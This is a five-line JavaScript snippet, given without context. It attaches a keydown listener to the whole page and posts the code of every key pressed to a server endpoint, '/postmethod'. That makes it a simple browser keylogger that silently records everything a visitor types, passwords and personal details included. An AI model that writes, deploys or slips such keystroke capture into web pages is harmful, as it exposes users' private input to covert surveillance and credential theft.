document.addEventListener('keydown', function(event) {
    $.post( "/postmethod", {
        keypress: event.keyCode
    });
});
